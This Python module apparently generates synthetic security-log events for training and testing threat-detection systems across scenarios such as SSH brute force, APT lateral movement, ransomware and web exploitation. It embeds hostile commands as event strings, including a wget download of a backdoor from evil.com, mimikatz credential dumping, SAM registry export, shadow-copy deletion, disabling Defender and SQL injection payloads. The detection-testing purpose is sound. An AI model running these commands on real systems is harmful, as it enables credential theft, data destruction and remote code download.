"""
simulation/threat_simulator.py
────────────────────────────────
Generates realistic synthetic threat scenarios for RL training and
end-to-end system testing. Produces log events that mimic real attack
patterns mapped to MITRE ATT&CK techniques.

Scenarios:
    apt_lateral_movement    — Multi-stage APT with lateral movement
    brute_force_ssh         — SSH brute force followed by compromise
    data_exfiltration       — Credential theft + bulk data transfer
    ransomware              — Ransomware deployment chain
    insider_threat          — Privileged user data theft
    port_scan_recon         — Network reconnaissance
    web_exploit             — Web application exploitation
""" 

from __future__ import annotations

import asyncio
import random
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta
from typing import Any, AsyncIterator, Dict, List, Optional

from loguru import logger

from config.settings import get_settings


# ── Scenario definitions ──────────────────────────────────────────

SCENARIOS: Dict[str, Dict[str, Any]] = {
    "apt_lateral_movement": {
        "description": "Multi-stage APT campaign with lateral movement across the network",
        "techniques": ["T1078", "T1021", "T1570", "T1003", "T1041"],
        "duration_seconds": 300,
        "severity": "CRITICAL",
    },
    "brute_force_ssh": {
        "description": "SSH brute force attack followed by successful compromise",
        "techniques": ["T1110", "T1078", "T1059"],
        "duration_seconds": 120,
        "severity": "HIGH",
    },
    "data_exfiltration": {
        "description": "Credential dumping followed by bulk data exfiltration",
        "techniques": ["T1003", "T1041", "T1048"],
        "duration_seconds": 180,
        "severity": "CRITICAL",
    },
    "ransomware": {
        "description": "Ransomware deployment: delivery, execution, encryption",
        "techniques": ["T1566", "T1059", "T1486", "T1562"],
        "duration_seconds": 240,
        "severity": "CRITICAL",
    },
    "insider_threat": {
        "description": "Privileged insider accessing and exfiltrating sensitive data",
        "techniques": ["T1078", "T1082", "T1041"],
        "duration_seconds": 600,
        "severity": "HIGH",
    },
    "port_scan_recon": {
        "description": "Network reconnaissance and service discovery",
        "techniques": ["T1046", "T1082"],
        "duration_seconds": 60,
        "severity": "MEDIUM",
    },
    "web_exploit": {
        "description": "Web application exploitation leading to RCE",
        "techniques": ["T1190", "T1059", "T1068"],
        "duration_seconds": 150,
        "severity": "HIGH",
    },
}

# Sample enterprise IP ranges
INTERNAL_IPS = [
    "10.0.0.10", "10.0.0.20", "10.0.0.30", "10.0.0.40", "10.0.0.50",
    "192.168.1.100", "192.168.1.101", "192.168.1.102", "192.168.1.200",
    "172.16.0.10", "172.16.0.20", "172.16.0.30",
]
EXTERNAL_IPS = [
    "203.0.113.10", "198.51.100.5", "185.220.101.50",
    "91.108.4.100", "45.33.32.156",
]
USERNAMES = ["admin", "jsmith", "mwilson", "svc_backup", "dbadmin", "root", "administrator"]
HOSTNAMES = ["dc01", "fileserver01", "webserver01", "dbserver01", "workstation-042", "jumpbox01"]


@dataclass
class SimulationState:
    """Tracks the current state of a running simulation."""

    scenario: str
    intensity: float
    start_time: datetime
    attacker_ip: str
    target_ips: List[str]
    compromised_hosts: List[str] = field(default_factory=list)
    events_generated: int = 0
    active: bool = True
    simulation_id: str = field(default_factory=lambda: str(uuid.uuid4()))


class ThreatSimulator:
    """
    Generates synthetic threat scenarios as streams of log events.

    Each scenario produces a realistic sequence of log events that
    mimic real attack patterns, suitable for:
        - RL agent training
        - Detection pipeline testing
        - Alert correlation validation

    Usage::

        sim = ThreatSimulator()
        async for event in sim.run_scenario("brute_force_ssh", intensity=0.7):
            process(event)
    """

    def __init__(self) -> None:
        self._settings = get_settings()
        self._active_simulations: Dict[str, SimulationState] = {}
        self._rng = random.Random()

    # ── Public API ────────────────────────────────────────────────

    def list_scenarios(self) -> List[Dict[str, Any]]:
        """Return available scenario definitions."""
        return [
            {"name": name, **meta}
            for name, meta in SCENARIOS.items()
        ]

    def get_active_simulations(self) -> List[Dict[str, Any]]:
        """Return currently running simulations."""
        return [
            {
                "simulation_id": s.simulation_id,
                "scenario": s.scenario,
                "intensity": s.intensity,
                "events_generated": s.events_generated,
                "compromised_hosts": s.compromised_hosts,
                "elapsed_seconds": (
                    datetime.now(timezone.utc) - s.start_time
                ).total_seconds(),
            }
            for s in self._active_simulations.values()
            if s.active
        ]

    def stop_simulation(self, simulation_id: str) -> bool:
        """Stop a running simulation."""
        if simulation_id in self._active_simulations:
            self._active_simulations[simulation_id].active = False
            logger.info("Simulation {} stopped", simulation_id)
            return True
        return False

    async def run_scenario(
        self,
        scenario: str,
        intensity: float = 0.5,
        duration_override: Optional[int] = None,
    ) -> AsyncIterator[Dict[str, Any]]:
        """
        Run a named threat scenario and yield log events.

        Args:
            scenario:          Scenario name (see SCENARIOS dict)
            intensity:         0.0–1.0, controls event rate and severity
            duration_override: Override scenario duration in seconds

        Yields:
            Normalised log event dicts compatible with the detection pipeline
        """
        if scenario not in SCENARIOS:
            raise ValueError(f"Unknown scenario: {scenario}. Available: {list(SCENARIOS.keys())}")

        meta = SCENARIOS[scenario]
        attacker_ip = self._rng.choice(EXTERNAL_IPS)
        target_ips = self._rng.sample(INTERNAL_IPS, k=min(3, len(INTERNAL_IPS)))

        state = SimulationState(
            scenario=scenario,
            intensity=intensity,
            start_time=datetime.now(timezone.utc),
            attacker_ip=attacker_ip,
            target_ips=target_ips,
        )
        self._active_simulations[state.simulation_id] = state

        duration = duration_override or meta["duration_seconds"]
        logger.info(
            "Starting simulation: scenario={} id={} intensity={} duration={}s",
            scenario, state.simulation_id, intensity, duration,
        )

        # Dispatch to scenario-specific generator
        generators = {
            "apt_lateral_movement": self._gen_apt_lateral_movement,
            "brute_force_ssh": self._gen_brute_force_ssh,
            "data_exfiltration": self._gen_data_exfiltration,
            "ransomware": self._gen_ransomware,
            "insider_threat": self._gen_insider_threat,
            "port_scan_recon": self._gen_port_scan_recon,
            "web_exploit": self._gen_web_exploit,
        }

        gen_fn = generators.get(scenario, self._gen_generic)
        async for event in gen_fn(state, duration):
            if not state.active:
                break
            state.events_generated += 1
            yield event

        state.active = False
        logger.info(
            "Simulation complete: scenario={} events={}",
            scenario, state.events_generated,
        )

    # ── Scenario generators ───────────────────────────────────────

    async def _gen_brute_force_ssh(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """SSH brute force: many failures → success → command execution."""
        target = state.target_ips[0]
        username = self._rng.choice(USERNAMES)
        interval = max(0.1, 0.5 / state.intensity)

        # Phase 1: Brute force failures
        failure_count = int(50 * state.intensity)
        for i in range(failure_count):
            yield self._make_auth_event(
                src_ip=state.attacker_ip,
                dst_ip=target,
                username=username,
                success=False,
                severity="WARNING",
            )
            await asyncio.sleep(interval * 0.1)

        # Phase 2: Successful login
        yield self._make_auth_event(
            src_ip=state.attacker_ip,
            dst_ip=target,
            username=username,
            success=True,
            severity="ERROR",
        )
        state.compromised_hosts.append(target)
        await asyncio.sleep(interval)

        # Phase 3: Post-compromise commands
        commands = ["whoami", "id", "uname -a", "cat /etc/passwd", "ps aux", "netstat -an"]
        for cmd in commands:
            yield self._make_process_event(
                src_ip=state.attacker_ip,
                host=target,
                username=username,
                command=cmd,
                severity="ERROR",
            )
            await asyncio.sleep(interval * 0.5)

    async def _gen_apt_lateral_movement(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """APT: initial access → credential dump → lateral movement → exfil."""
        interval = max(0.2, 1.0 / state.intensity)
        initial_target = state.target_ips[0]

        # Phase 1: Initial access via valid account
        yield self._make_auth_event(
            src_ip=state.attacker_ip,
            dst_ip=initial_target,
            username="jsmith",
            success=True,
            severity="WARNING",
        )
        state.compromised_hosts.append(initial_target)
        await asyncio.sleep(interval)

        # Phase 2: Discovery
        for _ in range(5):
            yield self._make_process_event(
                src_ip=state.attacker_ip,
                host=initial_target,
                username="jsmith",
                command=self._rng.choice(["systeminfo", "net user /domain", "ipconfig /all", "arp -a"]),
                severity="WARNING",
            )
            await asyncio.sleep(interval * 0.3)

        # Phase 3: Credential dumping
        yield self._make_process_event(
            src_ip=state.attacker_ip,
            host=initial_target,
            username="jsmith",
            command="mimikatz.exe sekurlsa::logonpasswords",
            severity="CRITICAL",
        )
        await asyncio.sleep(interval)

        # Phase 4: Lateral movement to additional hosts
        for next_target in state.target_ips[1:]:
            yield self._make_network_event(
                src_ip=initial_target,
                dst_ip=next_target,
                dst_port=445,
                protocol="TCP",
                severity="ERROR",
                event_type="lateral_movement",
            )
            state.compromised_hosts.append(next_target)
            await asyncio.sleep(interval * 0.5)

            yield self._make_auth_event(
                src_ip=initial_target,
                dst_ip=next_target,
                username="administrator",
                success=True,
                severity="CRITICAL",
            )
            await asyncio.sleep(interval)

        # Phase 5: Exfiltration
        for _ in range(3):
            yield self._make_network_event(
                src_ip=state.target_ips[-1],
                dst_ip=state.attacker_ip,
                dst_port=443,
                protocol="TCP",
                payload_size=self._rng.randint(500_000, 5_000_000),
                severity="CRITICAL",
                event_type="data_exfiltration",
            )
            await asyncio.sleep(interval)

    async def _gen_data_exfiltration(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Credential theft followed by bulk data exfiltration."""
        interval = max(0.2, 0.8 / state.intensity)
        target = state.target_ips[0]

        # Credential access
        yield self._make_process_event(
            src_ip=state.attacker_ip,
            host=target,
            username="dbadmin",
            command="reg save HKLM\\SAM sam.hive",
            severity="CRITICAL",
        )
        await asyncio.sleep(interval)

        # Large transfers
        for i in range(int(5 * state.intensity)):
            yield self._make_network_event(
                src_ip=target,
                dst_ip=state.attacker_ip,
                dst_port=self._rng.choice([443, 8443, 4444]),
                protocol="TCP",
                payload_size=self._rng.randint(1_000_000, 10_000_000),
                severity="CRITICAL",
                event_type="data_exfiltration",
            )
            await asyncio.sleep(interval * 0.5)

        # DNS tunneling
        for _ in range(int(10 * state.intensity)):
            yield self._make_dns_event(
                src_ip=target,
                query=f"{''.join(self._rng.choices('abcdefghijklmnop0123456789', k=40))}.evil-c2.com",
                severity="HIGH",
            )
            await asyncio.sleep(interval * 0.2)

    async def _gen_ransomware(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Ransomware: phishing → execution → defense evasion → encryption."""
        interval = max(0.1, 0.5 / state.intensity)
        target = state.target_ips[0]

        # Delivery via phishing
        yield self._make_process_event(
            src_ip=state.attacker_ip,
            host=target,
            username="jsmith",
            command="WINWORD.EXE /macro invoice_2024.docm",
            severity="HIGH",
        )
        await asyncio.sleep(interval)

        # Defense evasion: disable AV
        yield self._make_process_event(
            src_ip=state.attacker_ip,
            host=target,
            username="jsmith",
            command="powershell Set-MpPreference -DisableRealtimeMonitoring $true",
            severity="CRITICAL",
        )
        await asyncio.sleep(interval)

        # Delete shadow copies
        yield self._make_process_event(
            src_ip=state.attacker_ip,
            host=target,
            username="jsmith",
            command="vssadmin delete shadows /all /quiet",
            severity="CRITICAL",
        )
        await asyncio.sleep(interval)

        # Mass file encryption (high volume file events)
        for i in range(int(20 * state.intensity)):
            yield self._make_file_event(
                host=target,
                file_path=f"C:\\Users\\jsmith\\Documents\\file_{i:04d}.docx.encrypted",
                operation="write",
                severity="CRITICAL",
            )
            await asyncio.sleep(interval * 0.05)

        # Ransom note
        yield self._make_file_event(
            host=target,
            file_path="C:\\Users\\jsmith\\Desktop\\README_DECRYPT.txt",
            operation="create",
            severity="CRITICAL",
        )

    async def _gen_insider_threat(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Insider threat: privileged user accessing and exfiltrating data."""
        interval = max(0.5, 2.0 / state.intensity)
        target = state.target_ips[0]
        username = "dbadmin"

        # Unusual access time (off-hours)
        yield self._make_auth_event(
            src_ip=self._rng.choice(INTERNAL_IPS),
            dst_ip=target,
            username=username,
            success=True,
            severity="WARNING",
        )
        await asyncio.sleep(interval)

        # Access to sensitive resources
        for resource in ["customer_db", "financial_records", "hr_data", "ip_repository"]:
            yield self._make_process_event(
                src_ip=self._rng.choice(INTERNAL_IPS),
                host=target,
                username=username,
                command=f"SELECT * FROM {resource} LIMIT 100000",
                severity="WARNING",
            )
            await asyncio.sleep(interval * 0.5)

        # Exfiltration via USB / cloud
        yield self._make_network_event(
            src_ip=target,
            dst_ip="104.18.32.100",  # cloud storage
            dst_port=443,
            protocol="TCP",
            payload_size=self._rng.randint(50_000_000, 200_000_000),
            severity="HIGH",
            event_type="data_exfiltration",
        )

    async def _gen_port_scan_recon(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Network reconnaissance: ICMP sweep + port scan."""
        interval = max(0.05, 0.2 / state.intensity)

        # ICMP sweep
        for ip in INTERNAL_IPS:
            yield self._make_network_event(
                src_ip=state.attacker_ip,
                dst_ip=ip,
                dst_port=None,
                protocol="ICMP",
                severity="INFO",
                event_type="reconnaissance",
            )
            await asyncio.sleep(interval * 0.1)

        # Port scan on discovered hosts
        target = state.target_ips[0]
        for port in [21, 22, 23, 25, 80, 443, 445, 3389, 8080, 8443]:
            yield self._make_network_event(
                src_ip=state.attacker_ip,
                dst_ip=target,
                dst_port=port,
                protocol="TCP",
                severity="WARNING",
                event_type="port_scan",
            )
            await asyncio.sleep(interval * 0.2)

    async def _gen_web_exploit(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Web application exploitation: SQLi → RCE → privilege escalation."""
        interval = max(0.1, 0.5 / state.intensity)
        target = state.target_ips[0]

        # SQL injection attempts
        for payload in ["' OR 1=1--", "'; DROP TABLE users--", "UNION SELECT * FROM users"]:
            yield self._make_http_event(
                src_ip=state.attacker_ip,
                dst_ip=target,
                method="POST",
                path="/login",
                status_code=500,
                payload=payload,
                severity="HIGH",
            )
            await asyncio.sleep(interval * 0.3)

        # Successful exploit
        yield self._make_http_event(
            src_ip=state.attacker_ip,
            dst_ip=target,
            method="POST",
            path="/api/upload",
            status_code=200,
            payload="webshell.php",
            severity="CRITICAL",
        )
        await asyncio.sleep(interval)

        # RCE via webshell
        for cmd in ["id", "whoami", "cat /etc/passwd", "wget http://evil.com/backdoor.sh"]:
            yield self._make_http_event(
                src_ip=state.attacker_ip,
                dst_ip=target,
                method="GET",
                path=f"/uploads/webshell.php?cmd={cmd}",
                status_code=200,
                payload=cmd,
                severity="CRITICAL",
            )
            await asyncio.sleep(interval * 0.5)

    async def _gen_generic(
        self, state: SimulationState, duration: int
    ) -> AsyncIterator[Dict[str, Any]]:
        """Generic fallback scenario."""
        interval = max(0.1, 1.0 / state.intensity)
        end_time = datetime.now(timezone.utc) + timedelta(seconds=duration)

        while datetime.now(timezone.utc) < end_time and state.active:
            yield self._make_auth_event(
                src_ip=state.attacker_ip,
                dst_ip=self._rng.choice(state.target_ips),
                username=self._rng.choice(USERNAMES),
                success=self._rng.random() > 0.8,
                severity="WARNING",
            )
            await asyncio.sleep(interval)

    # ── Event factories ───────────────────────────────────────────

    def _base_event(self, severity: str, event_type: str) -> Dict[str, Any]:
        return {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "severity": severity,
            "event_type": event_type,
            "index": "sentinel-simulation",
            "is_simulated": True,
        }

    def _make_auth_event(
        self,
        src_ip: str,
        dst_ip: str,
        username: str,
        success: bool,
        severity: str,
    ) -> Dict[str, Any]:
        event = self._base_event(severity, "authentication")
        event.update({
            "source_ip": src_ip,
            "dest_ip": dst_ip,
            "user": username,
            "host": self._rng.choice(HOSTNAMES),
            "raw_message": (
                f"{'Accepted' if success else 'Failed'} password for {username} "
                f"from {src_ip} port {self._rng.randint(1024, 65535)} ssh2"
            ),
            "auth_success": success,
            "is_anomalous": not success or self._rng.random() > 0.7,
        })
        return event

    def _make_process_event(
        self,
        src_ip: str,
        host: str,
        username: str,
        command: str,
        severity: str,
    ) -> Dict[str, Any]:
        event = self._base_event(severity, "process_execution")
        event.update({
            "source_ip": src_ip,
            "host": host,
            "user": username,
            "process": command.split()[0] if command else "unknown",
            "raw_message": f"Process executed: {command} by {username} on {host}",
            "command_line": command,
            "is_anomalous": True,
        })
        return event

    def _make_network_event(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: Optional[int],
        protocol: str,
        severity: str,
        event_type: str = "network",
        payload_size: int = 0,
    ) -> Dict[str, Any]:
        event = self._base_event(severity, event_type)
        event.update({
            "source_ip": src_ip,
            "dest_ip": dst_ip,
            "dst_port": dst_port,
            "protocol": protocol,
            "payload_size": payload_size,
            "raw_message": f"{protocol} {src_ip} -> {dst_ip}:{dst_port} ({payload_size} bytes)",
            "is_anomalous": payload_size > 1_000_000 or event_type in ("lateral_movement", "data_exfiltration"),
        })
        return event

    def _make_dns_event(
        self, src_ip: str, query: str, severity: str
    ) -> Dict[str, Any]:
        event = self._base_event(severity, "dns")
        event.update({
            "source_ip": src_ip,
            "raw_message": f"DNS query: {query} from {src_ip}",
            "dns_query": query,
            "is_anomalous": len(query) > 50,
        })
        return event

    def _make_file_event(
        self, host: str, file_path: str, operation: str, severity: str
    ) -> Dict[str, Any]:
        event = self._base_event(severity, "file")
        event.update({
            "host": host,
            "raw_message": f"File {operation}: {file_path} on {host}",
            "file_path": file_path,
            "file_operation": operation,
            "is_anomalous": ".encrypted" in file_path or "README_DECRYPT" in file_path,
        })
        return event

    def _make_http_event(
        self,
        src_ip: str,
        dst_ip: str,
        method: str,
        path: str,
        status_code: int,
        payload: str,
        severity: str,
    ) -> Dict[str, Any]:
        event = self._base_event(severity, "http")
        event.update({
            "source_ip": src_ip,
            "dest_ip": dst_ip,
            "dst_port": 80,
            "protocol": "TCP",
            "raw_message": f'{method} {path} HTTP/1.1 {status_code} - "{payload}"',
            "http_method": method,
            "http_path": path,
            "http_status": status_code,
            "is_anomalous": status_code >= 500 or any(
                kw in payload for kw in ["SELECT", "DROP", "UNION", ".php", "wget"]
            ),
        })
        return event
